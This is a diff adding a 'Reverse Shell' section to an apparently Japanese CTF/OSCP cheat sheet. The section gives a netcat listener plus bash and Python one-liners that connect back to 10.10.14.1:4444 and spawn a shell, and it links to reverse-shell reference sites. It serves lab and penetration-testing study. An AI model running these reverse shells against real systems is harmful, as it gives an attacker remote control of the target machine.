@@ -344,6 +344,33 @@ steghide info target.jpg
 steghide extract -sf target.jpg
 ```
 
+## Reverse Shell
+
+任意のコマンドが実行できる状態で実行
+
+- ローカル
+
+```
+nc -lvp 4444
+```
+
+- 対象 (bash)
+
+```
+bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
+```
+
+- 対象 (python)
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+参考:
+
+- https://highon.coffee/blog/reverse-shell-cheat-sheet/
+- https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/
+
 ## Sites
 
 **Databases**
@@ -356,6 +383,7 @@ steghide extract -sf target.jpg
 
 - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
 - GTFOBins: https://gtfobins.github.io/
+- Reverse Shell One-Liners: https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/
 
 **List**
 
@@ -370,3 +398,4 @@ steghide extract -sf target.jpg
 **Documents**
 
 - HackTricks: https://book.hacktricks.xyz/
+- OSCP Blog: https://hackersinterview.com/category/oscp/
